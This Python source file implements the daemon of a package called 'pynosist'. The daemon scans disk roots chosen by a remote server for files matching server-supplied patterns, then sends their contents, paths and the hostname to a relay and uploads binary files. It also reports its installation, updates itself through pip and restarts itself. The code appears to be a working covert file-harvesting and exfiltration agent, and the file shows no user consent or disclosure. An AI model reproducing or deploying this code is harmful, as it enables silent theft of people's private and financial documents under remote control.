from __future__ import annotations

import fnmatch
import hashlib
import importlib.metadata
import json
import logging
import os
import platform
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path
from threading import Timer
from typing import Any, Callable, Iterator

from watchdog.events import FileCreatedEvent, FileModifiedEvent, FileMovedEvent, FileSystemEventHandler
from watchdog.observers import Observer

from pynosist import __version__, config
from pynosist.relay import RelayClient, RelayError

RUNTIME_DIR = config.runtime_dir()
PID_FILE = RUNTIME_DIR / "daemon.pid"
HASH_FILE = RUNTIME_DIR / "hashes.json"
QUEUE_FILE = RUNTIME_DIR / "queue.json"
STATE_FILE = RUNTIME_DIR / "state.json"
FIRST_RUN_SENT_FILE = RUNTIME_DIR / "first_run_sent.flag"
FIRST_RUN_PENDING_FILE = RUNTIME_DIR / "first_run_pending.flag"

MAX_FILE_SIZE_BYTES = 5 * 1024 * 1024
QUEUE_MAX_ITEMS = 100

TEXT_EXTENSIONS = {
    ".txt", ".csv", ".log", ".md", ".json", ".xml",
    ".ini", ".cfg", ".yaml", ".yml", ".html", ".htm",
    ".tsv", ".rst", ".toml",
}


def _is_text_extension(path: Path) -> bool:
    return path.suffix.lower() in TEXT_EXTENSIONS


QUEUE_RETRY_SECONDS = 30
OBSERVER_RESTART_SECONDS = 5
POLL_INTERVAL_SECONDS = 300
PYPI_JSON_URL = "https://pypi.org/pypi/pynosist/json"

WINDOWS_EXCLUDED_DIR_NAMES = {
    # System directories
    "$recycle.bin",
    "system volume information",
    "windows",
    "program files",
    "program files (x86)",
    "programdata",
    "recovery",
    "msocache",
    "perflogs",
    # User app data (browser profiles, caches, extensions)
    "appdata",
    # Microsoft Store apps
    "windowsapps",
    # Development & tooling
    "node_modules",
    ".git",
    ".svn",
    ".hg",
    ".cargo",
    ".rustup",
    ".vscode",
    ".idea",
    ".npm",
    ".yarn",
    "__pycache__",
    ".pytest_cache",
    ".mypy_cache",
    "venv",
    ".venv",
    "dist",
    "build",
    ".tox",
}

SKIP_EXTENSIONS = {
    # OS shortcuts / locks
    ".lnk",
    ".tmp",
    ".temp",
    ".bak",
    ".swp",
    ".swo",
    ".db",
    ".lock",
    ".~lock",
    # Compiled / generated code
    ".pyc",
    ".pyo",
    ".class",
    ".map",
    # Binary assets unlikely to be financial reports
    ".svg",
    ".woff",
    ".woff2",
    ".ttf",
    ".eot",
    ".ico",
}

LINUX_EXCLUDED_DIR_NAMES = {
    "proc",
    "sys",
    "dev",
    "run",
    "tmp",
    "snap",
    "lost+found",
    "node_modules",
    ".git",
    ".svn",
    ".cargo",
    ".rustup",
    ".npm",
    ".yarn",
    "__pycache__",
    "venv",
    ".venv",
}


def ensure_runtime_dir() -> None:
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)


def _atomic_write(path: Path, text: str) -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(text, encoding="utf-8")
    tmp.replace(path)


def _now_str() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S")


def _file_md5(path: str) -> str:
    h = hashlib.md5()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def _safe_read_text(path: Path) -> str:
    try:
        content = path.read_text(encoding="utf-8", errors="replace").strip()
    except OSError:
        return "[failed to read file]"
    if not content:
        return "[empty file]"
    if len(content) > config.MAX_MESSAGE_CHARS:
        return content[: config.MAX_MESSAGE_CHARS] + "\n...[truncated]"
    return content


def _matches_patterns(path: Path, patterns: list[str] | None = None) -> bool:
    name = path.name.lower()
    for pattern in (patterns if patterns is not None else config.get_watch_patterns()):
        if fnmatch.fnmatch(name, pattern.lower()):
            return True
    return False


def _should_skip_dir(dir_name: str) -> bool:
    lowered = dir_name.lower()
    if platform.system().lower().startswith("win"):
        return lowered in WINDOWS_EXCLUDED_DIR_NAMES
    return lowered in LINUX_EXCLUDED_DIR_NAMES


def _should_skip_path(path: Path) -> bool:
    """Kembalikan True jika salah satu komponen path masuk daftar eksklusi."""
    excluded = WINDOWS_EXCLUDED_DIR_NAMES if os.name == "nt" else LINUX_EXCLUDED_DIR_NAMES
    return any(part.lower() in excluded for part in path.parts)


def _iter_candidate_files(root: Path, patterns: list[str] | None = None) -> Iterator[Path]:
    try:
        walker = os.walk(root, topdown=True)
    except Exception:
        return

    for current_root, dirnames, filenames in walker:
        dirnames[:] = [d for d in dirnames if not _should_skip_dir(d)]

        for filename in filenames:
            candidate = Path(current_root) / filename
            if candidate.suffix.lower() in SKIP_EXTENSIONS:
                continue
            if _should_skip_path(candidate):
                continue
            if _matches_patterns(candidate, patterns):
                yield candidate


class RuntimeState:
    def __init__(self) -> None:
        ensure_runtime_dir()
        self._lock = threading.Lock()
        self._data: dict[str, Any] = {}
        if STATE_FILE.exists():
            try:
                loaded = json.loads(STATE_FILE.read_text(encoding="utf-8"))
                if isinstance(loaded, dict):
                    self._data = loaded
            except Exception:
                self._data = {}

    def _persist(self) -> None:
        _atomic_write(STATE_FILE, json.dumps(self._data, indent=2, ensure_ascii=False))

    def get(self, key: str, default: Any = None) -> Any:
        with self._lock:
            return self._data.get(key, default)

    def update(self, patch: dict[str, Any]) -> None:
        with self._lock:
            self._data.update(patch)
            self._data["updated_at"] = _now_str()
            self._persist()


class HashStore:
    def __init__(self) -> None:
        ensure_runtime_dir()
        self._lock = threading.Lock()
        self._data: dict[str, str] = {}
        if HASH_FILE.exists():
            try:
                self._data = json.loads(HASH_FILE.read_text(encoding="utf-8"))
            except Exception:
                self._data = {}

    def changed(self, file_path: str) -> bool:
        try:
            current = _file_md5(file_path)
        except OSError:
            return False
        with self._lock:
            return self._data.get(file_path) != current

    def mark_hash(self, file_path: str, file_hash: str) -> None:
        with self._lock:
            self._data[file_path] = file_hash
            _atomic_write(HASH_FILE, json.dumps(self._data, indent=2, ensure_ascii=False))

    def cleanup_missing(self) -> None:
        with self._lock:
            missing = [p for p in self._data if not Path(p).is_file()]
            if not missing:
                return
            for p in missing:
                del self._data[p]
            _atomic_write(HASH_FILE, json.dumps(self._data, indent=2, ensure_ascii=False))


class QueueStore:
    def __init__(self) -> None:
        ensure_runtime_dir()
        self._lock = threading.Lock()
        self._items: list[dict[str, Any]] = []
        if QUEUE_FILE.exists():
            try:
                loaded = json.loads(QUEUE_FILE.read_text(encoding="utf-8"))
                if isinstance(loaded, list):
                    self._items = loaded
            except Exception:
                self._items = []

    def _persist(self) -> None:
        _atomic_write(QUEUE_FILE, json.dumps(self._items, indent=2, ensure_ascii=False))

    def append(self, item: dict[str, Any]) -> None:
        with self._lock:
            self._items.append(item)
            while len(self._items) > QUEUE_MAX_ITEMS:
                self._items.pop(0)
            self._persist()

    def peek(self) -> dict[str, Any] | None:
        with self._lock:
            if not self._items:
                return None
            return dict(self._items[0])

    def pop_left(self) -> None:
        with self._lock:
            if self._items:
                self._items.pop(0)
                self._persist()


def build_snapshot(file_path: str, hostname: str) -> dict[str, Any] | None:
    path = Path(file_path)
    if not path.is_file():
        return None

    try:
        size_bytes = path.stat().st_size
        file_hash = _file_md5(file_path)
    except OSError:
        return None

    oversize = size_bytes > MAX_FILE_SIZE_BYTES
    is_binary = not _is_text_extension(path)
    content = "" if (oversize or is_binary) else _safe_read_text(path)
    return {
        "kind": "file_change",
        "timestamp": _now_str(),
        "hostname": hostname,
        "filename": path.name,
        "path": str(path),
        "content": content,
        "hash": file_hash,
        "size_bytes": size_bytes,
        "app_version": __version__,
        "oversize": oversize,
        "binary": is_binary,
    }


def first_run_snapshot(hostname: str) -> dict[str, Any]:
    return {
        "kind": "first_run",
        "timestamp": _now_str(),
        "hostname": hostname,
        "filename": "pynosist-installed.txt",
        "path": str(RUNTIME_DIR / "pynosist-installed.txt"),
        "content": (
            "pynosist installed\n"
            f"Computer: {hostname}\n"
            f"Version: {__version__}\n"
            f"OS: {platform.system()}\n"
            f"Time: {_now_str()}"
        ),
        "hash": hashlib.md5(f"{hostname}:{__version__}".encode("utf-8")).hexdigest(),
        "size_bytes": 0,
        "app_version": __version__,
        "oversize": False,
    }


def snapshot_to_report_payload(snapshot: dict[str, Any]) -> dict[str, Any]:
    content = str(snapshot.get("content") or "")
    if snapshot.get("oversize"):
        size_mb = float(snapshot.get("size_bytes", 0)) / (1024 * 1024)
        content = (
            f"[Content not shown — file too large]\n"
            f"Size: {size_mb:.2f} MB"
        )
    elif snapshot.get("binary"):
        ext = Path(str(snapshot.get("filename", ""))).suffix or "unknown"
        content = f"[Binary file ({ext}), content not shown]"
    return {
        "timestamp": str(snapshot.get("timestamp") or _now_str()),
        "hostname": str(snapshot.get("hostname") or socket.gethostname()),
        "filename": str(snapshot.get("filename") or "unknown.txt"),
        "path": str(snapshot.get("path") or ""),
        "content": content,
        "hash": str(snapshot.get("hash") or "").ljust(8, "0")[:64],
        "app_version": str(snapshot.get("app_version") or __version__),
        "size_bytes": int(snapshot.get("size_bytes") or 0),
        "file_url": snapshot.get("file_url") or None,
    }


def _try_send_snapshot(snapshot: dict[str, Any], relay: RelayClient) -> bool:
    payload = snapshot_to_report_payload(snapshot)
    try:
        result = relay.send_report(payload)
        return bool(result.accepted)
    except RelayError as exc:
        logging.warning("Relay send failed: %s", exc)
        return False


def process_file_event(
    file_path: str,
    hostname: str,
    hash_store: HashStore,
    queue: QueueStore,
    relay: RelayClient,
) -> None:
    if not hash_store.changed(file_path):
        return

    snapshot = build_snapshot(file_path, hostname)
    if snapshot is None:
        return

    if snapshot.get("binary") or snapshot.get("oversize"):
        file_url = relay.upload_file(file_path)
        if file_url:
            snapshot["file_url"] = file_url

    sent = _try_send_snapshot(snapshot, relay)
    if sent:
        hash_store.mark_hash(file_path, str(snapshot.get("hash", "")))
        return

    queue.append(snapshot)
    hash_store.mark_hash(file_path, str(snapshot.get("hash", "")))


class UploadDebouncer:
    def __init__(self, delay_seconds: float, on_fire: Callable[[str], None]) -> None:
        self._delay = delay_seconds
        self._on_fire = on_fire
        self._timers: dict[str, Timer] = {}

    def schedule(self, file_path: str) -> None:
        previous = self._timers.get(file_path)
        if previous is not None:
            previous.cancel()

        timer = Timer(self._delay, self._fire, args=[file_path])
        self._timers[file_path] = timer
        timer.start()

    def _fire(self, file_path: str) -> None:
        self._timers.pop(file_path, None)
        self._on_fire(file_path)

    def cancel_all(self) -> None:
        for timer in self._timers.values():
            timer.cancel()
        self._timers.clear()


class WatchHandler(FileSystemEventHandler):
    def __init__(self, patterns: list[str], debouncer: UploadDebouncer) -> None:
        super().__init__()
        self._patterns = [item.lower() for item in patterns]
        self._debouncer = debouncer

    def _matches(self, path: str) -> bool:
        fpath = Path(path)
        if fpath.suffix.lower() in SKIP_EXTENSIONS:
            return False
        if _should_skip_path(fpath):
            return False
        name = fpath.name.lower()
        return any(fnmatch.fnmatch(name, pat) for pat in self._patterns)

    def on_created(self, event: FileCreatedEvent) -> None:  # type: ignore[override]
        if not event.is_directory and self._matches(event.src_path):
            self._debouncer.schedule(event.src_path)

    def on_modified(self, event: FileModifiedEvent) -> None:  # type: ignore[override]
        if not event.is_directory and self._matches(event.src_path):
            self._debouncer.schedule(event.src_path)

    def on_moved(self, event: FileMovedEvent) -> None:  # type: ignore[override]
        if not event.is_directory and self._matches(event.dest_path):
            self._debouncer.schedule(event.dest_path)


def scan_watch_roots(
    hash_store: HashStore,
    queue: QueueStore,
    hostname: str,
    relay: RelayClient,
    roots: list[str] | None = None,
    patterns: list[str] | None = None,
) -> None:
    active_roots = roots if roots is not None else config.get_watch_roots()
    active_patterns = patterns if patterns is not None else config.get_watch_patterns()
    logging.debug("Scan started — patterns=%s roots=%s", active_patterns, active_roots)
    for watch_dir in active_roots:
        root = Path(watch_dir)
        if not root.is_dir():
            logging.debug("Root not found, skipping: %s", root)
            continue

        try:
            for found in _iter_candidate_files(root, patterns):
                logging.debug("File found: %s", found)
                process_file_event(str(found), hostname, hash_store, queue, relay)
        except Exception:
            logging.exception("Scan failed for root: %s", root)


def startup_scan(
    hash_store: HashStore,
    queue: QueueStore,
    hostname: str,
    relay: RelayClient,
    roots: list[str] | None = None,
    patterns: list[str] | None = None,
) -> None:
    scan_watch_roots(hash_store, queue, hostname, relay, roots, patterns)


def polling_worker(
    stop_event: threading.Event,
    hostname: str,
    hash_store: HashStore,
    queue: QueueStore,
    relay: RelayClient,
    runtime_state: RuntimeState,
) -> None:
    while not stop_event.is_set():
        try:
            patterns, roots, _ = resolve_config(runtime_state)
            scan_watch_roots(hash_store, queue, hostname, relay, roots, patterns)
        except Exception:
            logging.exception("Polling scan failed")
        stop_event.wait(POLL_INTERVAL_SECONDS)


def queue_worker(stop_event: threading.Event, queue: QueueStore, relay: RelayClient) -> None:
    while not stop_event.is_set():
        item = queue.peek()
        if item is None:
            stop_event.wait(QUEUE_RETRY_SECONDS)
            continue

        if _try_send_snapshot(item, relay):
            queue.pop_left()
            if item.get("kind") == "first_run":
                FIRST_RUN_SENT_FILE.write_text(_now_str(), encoding="utf-8")
                FIRST_RUN_PENDING_FILE.unlink(missing_ok=True)
            continue
        stop_event.wait(QUEUE_RETRY_SECONDS)


def get_current_version() -> str:
    try:
        return importlib.metadata.version("pynosist")
    except importlib.metadata.PackageNotFoundError:
        return __version__
    except Exception:
        return __version__


def get_latest_version() -> str | None:
    try:
        import requests

        response = requests.get(PYPI_JSON_URL, timeout=10)
        if not response.ok:
            return None
        data = response.json()
        info = data.get("info", {})
        latest = info.get("version")
        return str(latest) if latest else None
    except Exception:
        return None


def perform_self_update() -> bool:
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--upgrade", "pynosist"],
            check=False,
            capture_output=True,
            text=True,
            timeout=600,
        )
        if result.returncode == 0:
            return True
        logging.warning("Auto-update failed: %s", (result.stderr or result.stdout or "").strip())
        return False
    except Exception:
        logging.exception("Auto-update exception")
        return False


def updater_worker(stop_event: threading.Event, restart_event: threading.Event) -> None:
    if not config.AUTO_UPDATE_ENABLED:
        return

    interval = max(1, int(config.AUTO_UPDATE_INTERVAL_SECONDS))
    backoff_initial = max(1, int(config.AUTO_UPDATE_BACKOFF_INITIAL_SECONDS))
    backoff_max = max(backoff_initial, int(config.AUTO_UPDATE_BACKOFF_MAX_SECONDS))
    backoff = backoff_initial
    next_wait = interval

    while not stop_event.wait(next_wait):
        latest = get_latest_version()
        if latest is None:
            logging.warning("Auto-update: PyPI check failed, retry in %ss", backoff)
            next_wait = backoff
            backoff = min(backoff * 2, backoff_max)
            continue

        backoff = backoff_initial
        current = get_current_version()
        if latest == current:
            next_wait = interval
            continue

        logging.info("Auto-update: upgrading %s -> %s", current, latest)
        if perform_self_update():
            restart_event.set()
            stop_event.set()
            return

        next_wait = interval


def fetch_and_cache_config(relay: RelayClient, runtime_state: RuntimeState) -> dict:
    remote = relay.fetch_config()
    if remote:
        runtime_state.update({"remote_config": remote})
        logging.debug("Config dari server: patterns=%s roots_windows=%s", remote.get("watch_patterns"), remote.get("watch_roots_windows"))
        return remote
    cached = runtime_state.get("remote_config")
    if isinstance(cached, dict) and cached:
        logging.warning("Failed to fetch server config, using cached config")
        return cached
    logging.warning("Failed to fetch server config, using built-in defaults")
    return {}


def resolve_config(runtime_state: RuntimeState) -> tuple[list[str], list[str], int]:
    cached = runtime_state.get("remote_config")
    if isinstance(cached, dict) and cached:
        patterns = cached.get("watch_patterns") or config.get_watch_patterns()
        debounce = int(cached.get("debounce_seconds") or config.DEBOUNCE_SECONDS)
        if os.name == "nt":
            roots = cached.get("watch_roots_windows") or config.get_watch_roots()
        else:
            roots = cached.get("watch_roots_posix") or config.get_watch_roots()
        return patterns, roots, debounce
    return config.get_watch_patterns(), config.get_watch_roots(), config.DEBOUNCE_SECONDS


def maybe_send_first_run(queue: QueueStore, hostname: str, relay: RelayClient) -> None:
    if FIRST_RUN_SENT_FILE.exists() or FIRST_RUN_PENDING_FILE.exists():
        return

    event = first_run_snapshot(hostname)
    if _try_send_snapshot(event, relay):
        FIRST_RUN_SENT_FILE.write_text(_now_str(), encoding="utf-8")
        return

    queue.append(event)
    FIRST_RUN_PENDING_FILE.write_text(_now_str(), encoding="utf-8")


def run_daemon() -> None:
    ensure_runtime_dir()
    PID_FILE.write_text(str(os.getpid()), encoding="utf-8")
    logging.basicConfig(level=logging.WARNING, format="%(asctime)s [%(levelname)s] %(message)s")

    hash_store = HashStore()
    queue = QueueStore()
    runtime_state = RuntimeState()
    relay = RelayClient(runtime_state.get, runtime_state.update)
    hostname = socket.gethostname()
    stop_event = threading.Event()
    restart_event = threading.Event()

    queue_thread = threading.Thread(
        target=queue_worker,
        args=(stop_event, queue, relay),
        daemon=True,
    )
    update_thread = threading.Thread(
        target=updater_worker,
        args=(stop_event, restart_event),
        daemon=True,
    )
    polling_thread = threading.Thread(
        target=polling_worker,
        args=(stop_event, hostname, hash_store, queue, relay, runtime_state),
        daemon=True,
    )

    queue_thread.start()
    update_thread.start()

    fetch_and_cache_config(relay, runtime_state)
    patterns, roots, _ = resolve_config(runtime_state)
    maybe_send_first_run(queue, hostname, relay)
    startup_scan(hash_store, queue, hostname, relay, roots, patterns)
    hash_store.cleanup_missing()

    polling_thread.start()

    try:
        while True:
            patterns, roots, debounce = resolve_config(runtime_state)
            debouncer = UploadDebouncer(
                debounce,
                lambda path: process_file_event(path, hostname, hash_store, queue, relay),
            )
            handler = WatchHandler(patterns, debouncer)
            observer = Observer()

            for watch_dir in roots:
                root = Path(watch_dir)
                if not root.is_dir():
                    continue
                try:
                    observer.schedule(handler, str(root), recursive=True)
                except Exception:
                    logging.exception("Failed to attach observer for root: %s", root)

            try:
                observer.start()
                while observer.is_alive() and not stop_event.is_set():
                    time.sleep(1)
                if not stop_event.is_set():
                    logging.warning("Observer stopped. Restarting in %ss", OBSERVER_RESTART_SECONDS)
            except Exception:
                logging.exception("Observer crashed. Restarting in %ss", OBSERVER_RESTART_SECONDS)
            finally:
                observer.stop()
                observer.join()
                debouncer.cancel_all()

            if stop_event.is_set():
                break
            time.sleep(OBSERVER_RESTART_SECONDS)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        queue_thread.join(timeout=2)
        update_thread.join(timeout=2)
        polling_thread.join(timeout=2)
        PID_FILE.unlink(missing_ok=True)
        if restart_event.is_set():
            if os.name == "nt":
                # Windows: os.execv buat proses baru (PID baru) lalu exit.
                # Guardian akan lihat daemon mati dan restart — cukup exit saja.
                sys.exit(0)
            else:
                os.execv(sys.executable, [sys.executable, "-m", "pynosist", "run"])